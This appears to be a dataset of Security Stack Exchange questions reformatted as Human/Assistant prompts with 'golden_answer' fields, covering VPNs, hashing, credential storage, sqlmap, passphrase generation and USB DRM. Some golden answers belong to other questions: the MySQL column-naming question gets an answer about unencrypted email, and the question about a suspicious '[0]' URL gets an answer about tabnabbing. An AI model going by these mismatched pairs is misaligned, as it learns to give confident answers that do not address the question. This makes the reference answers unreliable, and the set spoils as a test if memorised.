of A-grade browsers</a>, but they don't maintain which version is the latest known-good version and which versions are known to have vulnerabilities.</p>\n\n<p><strong>Suggestions</strong>: If you must check for outdated/vulnerable browser and plugin versions, I suggest that you look closely at  the <a href=\"http://www.mozilla.com/plugincheck/\">Mozilla plugin check website</a>, which checks whether you have any obsolete or vulnerable plugin version installed.  It supports Firefox, Safari, Chrome, and Opera, and partially supports IE.  You might want to copy or use their methods.  See also Mozilla's <a href=\"https://wiki.mozilla.org/PFS2\">JSON interface</a> to their plugin version database.</p>\n\n<p><strong>Bottom-line recommendation</strong>: I think you're asking the wrong question.  I think your question has some hidden assumptions and premises that are faulty.  Browser blacklisting is not an effective way of fixing or mitigating CSRF vulnerabilities.  And I think the question is unclear on the threat model.  I suggest that you re-ask the question afresh, this time starting with the actual problem you are trying to solve and the constraints you are working within, rather than making assumptions about what the best solution is (e.g., assuming that browser blacklisting is the best solution).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have an ISP supplied cable modem/router over which I have almost no control. They can upgrade the firmware remotely, so I assume they can do virtually anything with it.</p>\n\n<p>When I transfer data using the switch that is contained within the modem, I think they <em>could</em> look at the data. When I use my own switch which is connected to the ISP modem, will the ISP modem see the traffic that goes through the switch?</p>\n\n<p>I know WiFi that is secured with WPA2-PSK can be eavesdropped upon, same as BNC-style network or those old CAT-style hubs I had in 2000. That is the source of my confusion/suspicion. </p>\n\n\nAssistant:",
        "golden_answer": " <p>A switch will try to only send traffic to its intended recipient. But it is not guaranteed. If the switch doesn't know where the recipient is, it will send the packet to all devices connected to the switch.</p>\n\n<p>There are ways to make a switch forget where the intended recipient is (such as overflowing the CAM or MAC spoofing).</p>\n\n<p>There are also ways to make individual computers send packets to some other MAC than the intended recipient (ARP spoofing and the like).</p>\n\n<p>You should only consider a switched network to be a trusted network if you either trust every device connected to the network or the switch has some advanced security features to protect against all the attacks described above.</p>\n\n<p>You'd be better off using a router, which is controlled by yourself only. If using your own router would mean an (extra) layer of NAT, you should use a bridging firewall instead.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>It's clear that someone listening on a network could still find out what website I visit over HTTPS (as discussed <a href=\"https://security.stackexchange.com/questions/7705/does-ssl-tls-https-hide-the-urls-being-accessed\">here</a>) but what about when surfing in a VPN? What exactly can the underlying network (not the VPN host) see? Can it see what IP addresses (websites) I connect to whilst using a VPN?</p>\n\n\nAssistant:",
        "golden_answer": " <p>It mostly depends on the type of VPN you use, how it is setup and how you use it.</p>\n\n<p>Generally speaking, if your VPN is setup to process all your connections then the attacker will see the initial handshake and then only encrypted data (and some management traffic, from time to time).</p>\n\n<p>So, someone sniffing the network between you and the VPN host will not be able to see what web site you're accessing, what DNS requests you make or anything else.</p>\n\n<p>This, however, relies on a few critical elements that are not always guarantee:</p>\n\n<ul>\n<li>The client you're using is secure and properly configured.</li>\n<li>The attacker does not have any control on any part of the infrastructure you're going to use outside the network he's snooping on (specifically, he does not control the DNS server you're using - which might or might not be provided by your VPN or any other host you're accessing through your tunnel).</li>\n<li>You connect to your VPN provider before doing any browsing and keep using it all the time afterward until you terminate the session (it's easy to leak information when web sites can do requests in the background and when browsers might be setup to restart your previous session on startup).</li>\n</ul>\n\n<p>Also, be aware that it's possible to setup a VPN connection only to secure data that goes to a specific network. In that case, most of your traffic will actually be unencrypted.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've been tasked with creating a formal security testing schedule / calendar for our organisation's applications, as most of our current testing (scans, pentesting, etc) is done ad hoc.</p>\n\n<p>I'm wondering if anyone has created something similar for their organisation, and what process was used in order to build this schedule.</p>\n\n<p>My current thoughts are the following:</p>\n\n<ol>\n<li>Create a list of applications arranged into criticality categories based on the function they provide / consequences of successful attack (e.g. mission critical, critical, non-critical)</li>\n<li>Determine what needs to be determined for each criticality level through testing, and determine which tests will be done for each (e.g. Red-team testing only done on mission critical).</li>\n<li>Determine the regularity of tests and types of tests for each criticality category.</li>\n<li>Create a testing schedule.</li>\n</ol>\n\n<p>I've not had much opportunity to think about how often tests / types of tests should be done, so I'm very open to referrals to material I could review to get a better understanding. </p>\n\n\nAssistant:",
        "golden_answer": " <p>\"Testing\" only won't do it.</p>\n\n<ol>\n<li>Risk Assessment</li>\n</ol>\n\n<p>Frequency: Bi-annually </p>\n\n<ul>\n<li>Document information assets (systems, networks, infrastructure components, etc.)</li>\n<li>Identify threats to those assets (vulnerabilities, attack vectors, etc.)</li>\n<li>Examine and review how security controls and measures that are in place mitigate or eliminate the risk of those attacks (access controls, processes, policies, security standards, etc.)</li>\n<li>Identify security needs, remedies or areas for improvement</li>\n</ul>\n\n<p>When categorizing assets, don't simply look at the importance of the service it provides to the organization (e.g. mission critical), but look at the risks that are associated with potential compromise, the value of the information, the impact of potential compromise. A system could be totally unimportant to the organization's daily business, but it might be of great importance in terms of the information it can provide to an attacker, if compromised. We had a running joke at the office - one of our pentest engagements wasn't going anywhere, the web servers and public infrastructure of the client were all rock solid, but we managed to compromise the CFO secretary's laptop. Interestingly, it had a copy of the company's financial statement - days before it was going to be officially released. Since the client was a publicly listed company... you know where this goes.</p>\n\n<ol start=\"2\">\n<li>Security Audit</li>\n</ol>\n\n<p>Frequency: Quarterly</p>\n\n<p>Unfortunately, many forget that most issues can be identified by looking at things from the inside, rather than testing from the outside. A properly done audit may reveal issues that you might not be easily revealed during a pentest (let's have a look at the accounts defined for that Tomcat manager). Here are some basic points:</p>\n\n<ul>\n<li>Review configurations (servers, routers, switches, firewalls)</li>\n<li>Verify policies are enforced (e.g. make sure accounts of ex-employees have been removed, look at passwords and when were they last changed)</li>\n<li>Look at how backups are configured and done, encryption of sensitive data, how access control is implemented (including physical - badges and other seemingly unimportant items)</li>\n</ul>\n\n<p>_</p>\n\n<ol start=\"3\">\n<li>Systems Lifecycle</li>\n</ol>\n\n<p>Frequency: On-going</p>\n\n<p>Every time IT bring up a new system, add a network, or provide a new service, or decommission an old one, the infosec team must be involved to review, analyze and implement security measures. Make it a part of the process.</p>\n\n<ol start=\"4\">\n<li>Vulnerability and Patch Review</li>\n</ol>\n\n<p>Frequency: Weekly</p>\n\n<p>When you receive those security bulletins, if they contain items that are directly related to products/systems you've got installed, pay attention.\nAlso, don't \"assume\" all is patched on Tuesday - WSUS may work fine, but you've got to run some basic checks and look at the logs.</p>\n\n<p>There are more items, but this is already too long, and I'm not writing a book. Additional things to look at:</p>\n\n<ul>\n<li>Security events, incident reports and incident response</li>\n<li>Security awareness days</li>\n<li>Security round-table (involving the CEO)</li>\n<li>...</li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Perhaps I am misunderstanding the way in which HTTP over SSL works, but I was interested in whether the addresses visited by a browser via HTTPS are themselves encrypted? This is not only in terms of sniffing browsing patterns (though there are of course other ways to do this), but in particular, information sent using HTTP GET method (as this information is appended in the browser address bar). </p>\n\n\nAssistant:",
        "golden_answer": " <h2>Mostly - not the domain name</h2>\n\n<p>For https, the domain name part is sent unencrypted (since it may be needed to direct the request to different host / different https certificate), but the rest of the URL (e.g. the \"/questions/141958/does-https-encrypt-browser-address-history\" part of this question \"<a href=\"https://security.stackexchange.com/questions/141958/does-https-encrypt-browser-address-history\">Does HTTPS encrypt visited URL?</a>\") is encrypted in transit.</p>\n\n<p>Naturally, https affects only the network part, and the url is still available in plaintext for your browser (including the address history) and the server.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I was just reading about SSL/TLS stuff, and <a href=\"https://fancynossl.hboeck.de\" rel=\"noreferrer\">according to this site</a> (which is rated as A by Qualys SSL Labs), MD5 is totally broken, and SHA-1 is cryptographically weak since 2005. And yet, I noticed that a lot of programmers and even Microsoft only give us SHA-1/MD5 to check the integrity of files...</p>\n\n<p>As far I know, if I change one bit of a file, their MD5/SHA-1 will change so why/how they are broken? In which situations can I still trust checksums made with SHA-1/MD5? What about SSL certificates that still use SHA-1 like google.com?</p>\n\n<p>I am interested in applications of MD5 and SHA-1 for checksums and for certificate validation. I am not asking about password hashing, which <a href=\"https://security.stackexchange.com/questions/15790/why-do-people-still-use-recommend-md5-if-it-is-cracked-since-1996\">has been treated in this question</a>.</p>\n\n\nAssistant:",
        "golden_answer": " <p>SHA-1 and MD5 are broken in the sense that they are vulnerable to collision attacks. That is, it has become (or, for SHA-1, will soon become) realistic to find two strings that have the same hash.</p>\n\n<p>As explained <a href=\"https://security.stackexchange.com/a/31871/74726\">here</a>, collision attacks do not directly affect passwords or file integrity because those fall under the preimage and second preimage case, respectively.</p>\n\n<p>However, MD5 and SHA-1 are still less computationally expensive. Passwords hashed with these algorithms are easier to crack than the stronger algorithms that currently exist. Although not specifically broken, using stronger algorithms is advisable.</p>\n\n<p>In the case of certificates, signatures state that a hash of a particular certificate is valid for a particular website. But, if you can craft a second certificate with that hash, you can impersonate other websites. In the case of MD5, this has already happened, and browsers will be phasing out SHA-1 soon as a preventative measure (<a href=\"https://blog.mozilla.org/security/2014/09/23/phasing-out-certificates-with-sha-1-based-signature-algorithms/\" rel=\"noreferrer\">source</a>).</p>\n\n<p>File integrity checking is often intended to ensure that a file was downloaded correctly. But, if it is being used to verify that the file was not maliciously tampered with, you should consider an algorithm that is more resilient to collisions (see also: <a href=\"https://www.win.tue.nl/hashclash/SoftIntCodeSign/\" rel=\"noreferrer\">chosen-prefix attacks</a>).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>On a Linux system I'm running an utility like this:</p>\n\n<pre><code>$ /usr/bin/myapp myprivatekey\nEnter passphrase for the private key:...\n...application runs and uses the private key\n</code></pre>\n\n<p>My understanding is that if I have a private key encrypted with a passphrase it is more secure than an unencrypted one because the private key cannot be accessed even if the user account is compromised. So if the private key is loaded by a process running as a different user and the passphrase is typed manually by the user then one cannot intercept the above passphrase. Please note that the /usr/bin/myapp can only be written by root.</p>\n\n<p>On the other hand a colleague argues that, if the user account is compromised then the private key is compromised too even if it's protected by a passphrase, because if the account is compromised then the password typed by the user can be intercepted and one cannot be protect himself in such a situation.</p>\n\n<p>Which one is correct? Is it possible to setup a system such that the private key is protected in the above situation?</p>\n\n<p>Thanks!</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>Is an encrypted private key which never leaves my home directory more secure than an unencrypted one?</p>\n</blockquote>\n\n<p>Yes, it is more secure to use an encrypted private key than an unencrypted one. </p>\n\n<p>The argument your colleague gives just shows that an encrypted private key is not <em>completely</em> secure. His argument does not mean that an encrypted private key is no more secure than an unencrypted one. In fact, the opposite is true because the encrypted private key does protect against certain attackers and situtations that the unencrypted key does not. For example, it protects against the situation where you <em>accidentally</em> upload it to your public github account or something. It also protects against a specific type of attacker who only has read access to your directories/files. Because of these types of attacker and situations exist the encrypted private key is more secure.</p>\n\n<p>On the other hand, your colleague is correct that an attacker with local access who can run processes, keystroke recorders, etc on your system could still get your key. However, a local attacker is a very powerful type of attacker and in the presence of such an attacker it is difficult to protect your keys in general.  However, one thing that could be used to protect keys in this situation of local attack is a separate physical factor like an RSA dongle.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am new to cyber security but I am working on a project where I need to use it and I don't know where to start.  </p>\n\n<p>The application I am working on connects to Jira to retrieve data and generate reports. For the connection, I want to use a specific username and password. I cannot set them as a string in my code because every user would get my credentials. So, I thought about writing an encrypted file. </p>\n\n<p>The thing is if want to decrypt my file I will need to provide the decryption key in my code. and I think this is not secure at all because anyone that had access to the key could easily decrypt the file and therefore get my credentials. </p>\n\n<p>I found a method that encrypts a file and makes it so that the only person that would decrypt is the user who encrypted it. The problem is that the admin is the only one who has the right to encrypt the files and this will only mean that he would be the only one for whom the connection to Jira would work as he is the only one able to decrypt the credentials. </p>\n\n<p>I am also worried that if I read and decrypt the credentials then anyone could use a <code>console.writeline</code> and get the credentials. </p>\n\n<p>I am using c# for my application.</p>\n\n<p>Are there any ways I can secure my credentials?</p>\n\n<p>To connect and retrieve data from JIRA I need the username and password because I add them to my request header to connect and retrieve data. </p>\n\n\nAssistant:",
        "golden_answer": " <p>There is a bit of a Chicken and Egg Problem.</p>\n\n<p>The only thing that can be used is User Permission on the Device.\nThat means that there is a File that only the User from the Application can Read (OS-Permissions) or a Services where only the Logged In User has access to (example: Windows Credential Management API).</p>\n\n<p>Any other option is just more Obfuscation than \"Encryption\". How will you encrypt something, where you get a <em>secret</em>, without enter the <em>another secret</em> but other users should not get your <em>secret</em>. All options just go to a deeper Obfuscation (first Hardcoded, secound a scrambeld String, then a scrambeld String with another Random String linked,...)</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>If the key exchange happens when using lets say Wireguard or any other protocols that use IKA, and the connection never drops, could the ISP still detect the VPN traffic using Deep Packet Inspection?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes, the ISP could detect encrypted traffic (likely) corresponding to VPN. They could block it as well (such as blocking the server you are connecting to).</p>\n<p>They could <em>not</em> block specific traffic inside the VPN or know what is being transferred (unless that's obvious from traffic volumetry)</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>My client has a small \"Contact Us\" form on every page of their website. They are adamant about not including CAPTCHA verification on these forms, to keep them easy to use, but I feel it is my responsibility to implement some type of security against brute force attacks, etc. What are my options here, especially those that involve no changes to the UI of the forms.</p>\n\n<p>FYI, the client has ColdFusion 8 as their server-side scripting language, which is currently used to insert the data into the database. The solution doesn't have to be specific to ColdFusion, though. I'm looking for ideas here - not necessarily code snippets.</p>\n\n\nAssistant:",
        "golden_answer": " <p>This is a good summary article on CATPCHA:</p>\n\n<p><a href=\"http://www.smashingmagazine.com/2011/03/04/in-search-of-the-perfect-captcha/\" rel=\"nofollow\">http://www.smashingmagazine.com/2011/03/04/in-search-of-the-perfect-captcha/</a></p>\n\n<p>I think you are right not to use CAPTCHA. Research has show that <a href=\"http://www.90percentofeverything.com/2011/03/25/fk-captcha/\" rel=\"nofollow\">CAPTCHA can lower your conversion rates by 3% and potentially up to 30%</a>. Even employing someone to manually filter or using <a href=\"https://www.mturk.com/mturk/help?helpPage=overview#what_is\" rel=\"nofollow\">mechanical turk</a>, <a href=\"https://www.yourmaninindia.com/?module=main&amp;action=aboutus\" rel=\"nofollow\">yourmaninindia.com</a> etc maybe cheaper and better for your customer experience</p>\n\n<p>Good passive measures:</p>\n\n<ul>\n<li><p><a href=\"http://www.ecl-labs.org/2011/03/17/roboo-http-mitigator.html\" rel=\"nofollow\">The Roboo script</a>. Demoed at Blackhat this year and gives you some DOS protection as well.</p></li>\n<li><p>Adding a honeypot hidden field that should never be completed. You can use Javascript to fill this in automatically on legitimate form submissions and validate server side. </p></li>\n<li><p>Velocity measures such as how fast the form is submitted.</p></li>\n</ul>\n\n<p>All these are not perfect, can cause problems for disabled people and can give you false positives. If you are still getting an unacceptable amount of spam or robot usage then use the most popular and free option Re-Captcha. Ideally combine this with the passive steps above to only present the CAPTCHA if you suspect a bot submission (i.e. an adaptive approach not presented every time to users). Yes Re-Captcha has been broken in research labs with as much success as <a href=\"http://bitland.net/captcha.pdf\" rel=\"nofollow\">25%</a> using OCR techniques but it is still enough to deter dragnet bots seeking unprotected targets (running faster than the guy running from the bear). Also you are helping Google translate the worlds books and until duolingo.com comes up with its next innovation that is not a bad thing.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>So the question is simple. Does making strange column or database names in MySQL increase its security?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>Is there a risk to sending and receiving emails via without a secure SSL/TLS connection?</p>\n</blockquote>\n\n<p>The problem is equivalent to using your webmail via plain HTTP. A man-in-the-middle attacker could capture the emails you exchange with the server and sniff your login credentials as they are sent in plain text.</p>\n\n<p>Such an attack is possible for someone in the same Wifi as you, your roommate, your employer or your ISP - it is particularly easy for everyone who processes the traffic on the way between you and the server, but it's usually not feasible for a remote attacker (like a friend who's attacking you from their home).</p>\n\n<p>So, if you do it in your private home network and don't fear your ISP logging your data<sup>1</sup>, you're fine. In a public Wifi however, it's a serious risk - especially because email clients usually contact the server periodically in the background without your interaction. So, as opposed to using your webmail, you would not send your password just once in the beginning, but broadcast it every 15 minutes to check for updates.</p>\n\n<p>(Also note that it's particularly easy for an attacker to automatically extract POP3/IMAP/SMTP credentials from the traffic as their transmission is part of the respective protocol. For a webmail login form, they would at least have to search through the HTTP traffic to find the request where the password is transmitted.)</p>\n\n<p><sup>1</sup>In your case, the ISP <em>is</em> the mail provider so they obviously already have access to that information.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I encountered this question in SAQ A form and the question states:</p>\n\n<p>Is information maintained about which PCI DSS requirements are managed by each service provider, and which are managed by the entity?</p>\n\n<p>Who would be the entity in this case?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The entity would be the entity being assessed. The third parties would be the Payment Service Provider handling the transactions on behalf of the entity being assessed. There should be an understanding by the entity being assessed what are the compliance responsibilities being taken on by the Service Provider. This knowledge will allow the entity perform due diligence and monitor the Service Provider is satisfying its compliance requirements.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm using sqlmap on a test site and I wanted to modify some of the data inside of a table. Using the switch <code>--sql-query</code>.</p>\n<ul>\n<li><p>What is the correct syntax?</p>\n<p>example: is it <code>--sql-query=&quot;My_query_here&quot;</code>?<br />\nor maybe it's <code>--sql-query='myqueryhere'</code>?</p>\n</li>\n<li><p>How would I be able to modify multiple rows of data?</p>\n<p>example: Say I wanted to replace all data with the words. Game Over</p>\n</li>\n<li><p>Is it possible to drop in a shell?</p>\n</li>\n</ul>\n\n\nAssistant:",
        "golden_answer": " <p>Most databases do not allow you to just insert data using SQL Injection (Unless of course you are already in an insert query and even then you usually can't control the table name).  You can't simply stack queries,  that is only allowed in Microsoft SQL Server, PostgreSQL and comic books (like <a href=\"https://xkcd.com/327/\" rel=\"nofollow noreferrer\">xkcd</a>).  You can use a sub-select or union select to access data from another table, and SQLMap is doing this behind the scenes.</p>\n<p>SQLMap's real strength is in data exfiltration, and it has some tricks to get RCE.  But, If you want something more complex,  like a multi-staged attack that gives you a shell,  then you need to write a <a href=\"https://www.exploit-db.com/exploits/12510/\" rel=\"nofollow noreferrer\">multi-staged SQLi exploit like this one</a>, which I wrote.  If you want a deeper understanding of security then you need to write exploits to have that experience, take off the training wheels and be man (or woman or whatever).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>We should all know the <a href=\"https://xkcd.com/936/\" rel=\"nofollow noreferrer\">XKCD comic on password strength</a>, suggesting (appropriately) that a password based on <em>multiple</em> common words is more secure and memorable than a password such as <code>Aw3s0m3s4u(3</code> or something.</p>\n\n<p>I have an application (multi-platform) that I want to generate somewhat secure passwords for, and my password requirements are much less demanding: if the password has no spaces I expect the 'multiple symbols, numbers, mixed alpha and 6+ characters', but if the password has <em>more than one nonconsecutive space</em> I'm relaxing the symbol/number/mixed case constraint, and instead require <em>at least</em> two words that are no less than 4 characters individually, with a minimum password length of 15 characters.</p>\n\n<p>The question isn't about <em>that</em> aspect, but about generating: assuming I want to generate an easy-to-remember and hard-to-guess password for the user, is it cryptographically safe to generate a password based on 5 or so dictionary words from a 10k word list? (Literally 10k words sit in my database, scraped from various sources, emails, etc.) They're all pretty common words, no less than 3 characters in length.</p>\n\n<p>Now I don't <em>want</em> to make these one-time passwords, but I'm suspecting I should <em>at least</em> require the user to change it to something else upon logging in after using this generated password, which is fine and I <em>can</em>, but I also want users to have the option (on changing a password) to generate a 'secure' password that fits my requirements.</p>\n\n<p>From a cracking standpoint, how easy/difficult would it be to attack a password generated using this scheme? There's no fixed length, words in this database table range in length from 3 characters to 11 characters (<code>environment</code> is a word in the database, for example)? The programme generating the passwords <strong>will not</strong> pick two words with 4 or fewer characters (so the shortest password could be one three-character word, 4 five-character words, and 4 spaces, for a total of 27 characters), and it <strong>will not</strong> use the same term twice in a password.</p>\n\n<p>Based on samples I've run against it, the average password length generated by the programme is ~34 characters, which seems acceptable to me. Even if we assume that each of the 27 minimum non-space characters (so 23 characters in the end) can be 26 possible states (<code>a-z</code>), that's <code>23^26</code> or <code>2.54e+35</code> possibilities.</p>\n\n<p>There are 994 words in the database with 3 to 4 characters in length.</p>\n\n<p>We can also assume that the attacker <em>has</em> the dictionary, and the generation parameters/algorithm. Is this still secure, can I get away with taking one word away from the generated password (that's still 21 characters, for <code>18^26</code> possibilities (<code>4.33e+32</code>) based on entropy alone), the only problem I see is that this isn't based on <em>character</em> entropy, but on word entropy, which would mean the 5-word password is <code>10000*9006*9005*9004*9003</code> possibilities, or <code>6.5e+19</code> possibilities, and the 4-word password is <code>10000*9006*9005*9004</code> possibilities, or <code>7.30e+15</code>. Compared to a normal 6-character password (<code>(26+26+10+33)^6</code> or <code>7.35e+11</code> possibilities: <code>26</code> lower alpha, <code>26</code> upper alpha, <code>10</code> numbers, <code>33</code> symbols) it's significantly stronger.</p>\n\n<p>Another assumption I made: users <em>will</em> write this down, they always do. I <em>suspect</em> that five random words on a piece of paper (hopefully not in <em>direct</em> sight, but alas that's the most likely scenario) are less-likely to be picked up as a potential password than a, well, complex term that <em>looks</em> like a traditional password.</p>\n\n<p>Lastly, before I get to my actual questions, the passwords are <em>all</em> salted before stored in the database, then hashed with the <code>SHA-512</code> algorithm 100 times, with the salt being appended between each hash. If the user logs in successfully then the salt is changed and a new password hash is created. (I assume this doesn't help much in a brute-force offline attack, but it should help against active online attacks I would think.)</p>\n\n<pre><code>DatabasePassword = SHA512(...SHA512(SHA512(SHA512(password + salt) + salt) + salt) + salt)...)\n</code></pre>\n\n<p>So, finally, my <em>actual</em> questions:</p>\n\n<ol>\n<li>Is my math correct? (You don't necessarily have to answer this, I'm sure it's close enough in principle to demonstrate my concerns.)</li>\n<li>Is this <em>generation</em> secure or should I stick to the 'traditional' password generation? Do note that an attacker doesn't have <em>any</em> idea on whether the users' password was generated with this algorithm or selected by the user, the attacker can make an assumption <strong>if</strong> they know the length, but that may or may not be a safe one.</li>\n<li>Lastly, did I make any assumptions that would <em>significantly</em> alter (increase or decrease) the security of this 'idea'? (By assuming the per-character entropy of a 6-character password is 95, for example.)</li>\n</ol>\n\n<p>Apologies for the length, I'm used to over-explaining myself to <em>hopefully</em> alleviate confusion.</p>\n\n<hr>\n\n<p>It was pointed out that my question is <em>extremely</em> similar to <a href=\"https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase/6096#6096\">this one</a>, I want to point out the differences in my generation method (though, honestly, it's still similar enough that it could be considered a duplicate, I leave that up to the community to decide):</p>\n\n<ol>\n<li>Each word is separated by a space, this means that all but the first and last three characters have an additional <em>potential</em> state.</li>\n<li>The password is <em>not</em> selected by a human, it's (mostly) uniform-random generation. No words are preferred over others except to <em>only</em> allow one ultra-short (3 or 4 character) word, once the random generator selects a word of that length no more of those may be selected. (Though the position that word will be in the list of words is random still, and there may <em>not</em> be an ultra-short word selected.)</li>\n<li>This is mixed in with a <em>separate</em> password restriction, which means the attacker has two vectors to attempt to crack. The user could have selected a password meeting the 'traditional' requirements or a password meeting the 'XKCD' requirements.</li>\n</ol>\n\n\nAssistant:",
        "golden_answer": " <p>First, there is no such concept as a cryptographically secure password. The aim of a password is to be hard to guess for an attacker and how hard it should be to guess depends on how the password is used: if the account is locked after three failed attempts the password can be more weak compared to when an attacker can try an unlimited number of passwords or when the attacker has access to the hashed passwords.</p>\n\n<p>In your case you create a password from randomly choosing 5 words from a set of 10k words. Assuming that the attacker knows your dictionary (not unlikely because your requirement is easy to remember words) and the way the password is constructed from the dictionary this means that there are (10^4)^5 = 10^20 variants. This is similar to guessing 20 digits or a password with  12..13 random alpha-numeric mixed-case characters. Such passwords are usually considered secure enough for most purposes.</p>\n\n<p>As for the storage of the password: don't invent your own method but use methods proven to be good. For details see <a href=\"https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords\">How to securely hash passwords?</a>\nIn the current form I would consider the chosen method weak because you are using only 100 iterations with a hash function which is designed to be fast. Just for comparison: <a href=\"https://en.wikipedia.org/wiki/PBKDF2\" rel=\"noreferrer\">PBKDF2</a> recommended at least 1000 iterations in 2000 already and LastPass used 100.000 iterations for server side hashing in 2011. Fortunately you kind of make up for the weaker password storage by having more complex passwords.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm frequently getting these weird URLs.</p>\n<pre><code>https://mywebsite.com/mymage.php?id=1'[0]\n</code></pre>\n<p>The weird part is <code>'[0]</code>.</p>\n<p>The webpage pass the id to the database and the database expect an integer so we are frequently getting errors.</p>\n<p>Is it an attack? If yes, what is it targeting?</p>\n<p>Note: It's similar to this question that doesn't have any answer. <a href=\"https://security.stackexchange.com/questions/232717/what-type-of-attack-is-this-0\">What type of attack is this? &#39;[0]</a></p>\n\n\nAssistant:",
        "golden_answer": " <p><strong>Tabnabbing</strong> is when a malicious website that looks like a normal website (say, a blog), after some time, redirects itself to a phishing website that looks like some trusted website. For example, a blog article might redirect itself to a fake Facebook login page. This attack is only likely to be effective when you have lots of tabs open in your browser and you hardly know why, so you can easily be confused.</p>\n<p><strong>Reverse tabnabbing</strong> is more dangerous, because it can work even if you only have one tab. In reverse tabnabbing, a vulnerable website contains a link to a malicious website. The malicious website will open in a new tab, and then redirect the parent tab (the vulnerable website) to a malicious lookalike. As a result, while you are concentrating on the content of the site in the child tab (for example a blog post), the other tab (the parent) will magically become a phishing site.</p>\n<p>So <em>reverse tabnabbing</em> is much more effective because it actually targets a specific website in a specific tab that is likely to be trusted by the victim. In <em>tabnabbing</em> instead, the attacker needs some good luck in general. You asked: why doesn't a child tab just redirect itself instead of redirecting the parent? Because, whenever you can, it's always better to choose <em>reverse tabnabbing</em> over plain <em>tabnabbing</em>.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have a few bootable thumb drives with various OS's that I intend to let someone use. However, I need a way to ensure the USB drives can only be used once. Thus my question - is there a way to have a USB drive wipe itself after a certain amount of uses? Perhaps with a script or software / firmware on the drive itself?</p>\n\n<p>I have done some research on the topic already, but my searches yielded little useful information.</p>\n\n<p>Thanks ahead of time for assisting me with data rights management!</p>\n\n\nAssistant:",
        "golden_answer": " <h3>You want a DRM, not an \"<em>integrity</em>\" solution</h3>\n\n<p>First a small vocabulary precision. The \"<em>data integrity</em>\" term you use doesn't seem appropriate regarding your needs.</p>\n\n<ul>\n<li>A <em>data integrity</em> method would ensure that the data on the flash drive is genuine and/or cannot be in a corrupted or incoherent state, but this do not seem to be your concern here.</li>\n<li>A <em>Digital Right Management (DRM)</em> method, according to <a href=\"https://en.wikipedia.org/wiki/Digital_rights_management\" rel=\"nofollow noreferrer\">Wikipedia</a>, \"<em>is a term referring to various access control technologies that are used to restrict the usage of proprietary software, hardware, or content</em>.</li>\n</ul>\n\n<p>So what you need is a DRM solution, and not a data integrity solution.</p>\n\n<h3>Possible, but only on an industrial or semi-industrial scale</h3>\n\n<p>There is no really viable protection relying solely on the OS or any data publicly stored on the thumb-drive. Indeed, it is trivial to dump the raw thumb-drive content and restore it later to put it back in its pristine state.</p>\n\n<p>So, you can forget about self-deleting content, standard encryption which will be of no help against this, do not even think about storing a counter in some unallocated zone of the file-system (such tricks were used to protect CD-ROM's in the late 90's but will be of no help here).</p>\n\n<p>Some other answers suggest the use of an Internet-based service. This is how DRM-enabled PDF documents work: the document themselves are encrypted and upon each opening the decryption key is requested to some Adobe server. This may work, but you have better ensure that your software requesting the key and the protocol it uses cannot be reversed or replayed, otherwise the end-user will be able to get around your protection. All security will rely on this, and given enough time and determination consider that your software will eventually be broken, it just a matter of profit vs. efforts needed.</p>\n\n<p>The solution I suggest doesn't require any Internet access from the end-user and gives a good protection against reverse engineering attempts by keeping the security system out of the reach of end-users.</p>\n\n<h3>A firmware-based solution</h3>\n\n<p>You will need something not reachable to the user, and this will most probably mean you will have to customize your own firmware for the job.</p>\n\n<p>Following my idea, the storage area of your flash drive should be divided in three zones:</p>\n\n<ul>\n<li>One public and relatively small zones containing just enough material to initiate the boot procedure (it needs to be accessible to a standard BIOS),</li>\n<li>One very tiny zone accessible only to the firmware (and never accessible to the computer) storing the counter and, possibly, some other configuration and/or authentication material,</li>\n<li>The largest zone, accessible to the computer only after a successful internal authentication.</li>\n</ul>\n\n<p>The boot process would go as follow:</p>\n\n<ol>\n<li>The BIOS read the publicly accessible boot sector and initial boot executable,</li>\n<li>This initial executable initiates some custom authentication procedure with your firmware to unlock access to the main data,</li>\n<li>If the authentication is successful and the maximum number of allowed unlocks not reached yet, the firmware increments its internal unlock counter (stored in his private area) and then effectively unlock the main storage area,</li>\n<li>Once the main storage is accessible, the boot process can continue as usual.</li>\n</ol>\n\n<h3>Potential weaknesses</h3>\n\n<p>First potential weaknesses I could see:</p>\n\n<ul>\n<li>I do not know which application you intend to run on such thumb-drive, however an end-user may try to extract and copy the unlocked content (whether directly from the USB drive or from the mounted RAM disk) if your software allows him to do so (for instance if he is allowed to open a shell with root access). So you may want to restrict the user's privileges on the running system to prevent this.</li>\n<li>Your initial boot executable may use some obfuscation technique to prevent the authentication procedure to be easily leaked. In the hands of determined attacker, expect dead and live analysis since they can for instance connect your thumb-drive to a virtual machine to simulate a boot process and analyze the exchange between the initial executable and the thumb-drive.\nThe good news is that, <strong>even if the authentication process and secrets are reversed, this will not allow to tamper with the unlock counter or unlock an already locked thumb-drive</strong>.</li>\n<li>Your firmware may be overwriteable. When selecting a provider for your chips, you must ensure that they offer the possibility to lock any further update or rewrite of your firmware code. This may not be obvious, but there is actually plenty of USB devices where the firmware can be rewritten by end-users, see <a href=\"https://security.stackexchange.com/q/97246/32746\">BadUSB</a>. Since your security relies on your firmware, this may be an important criteria for you.</li>\n<li>If the value is high enough, a determined attacker may be willing to access directly the data stored in the NAND storage chips inside the thumb-drive. If this is a concern for you, you may want to implement on-the-fly encryption in your firmware so all stored data will be systematically encrypted.</li>\n</ul>\n\n<h3>Feasibility / 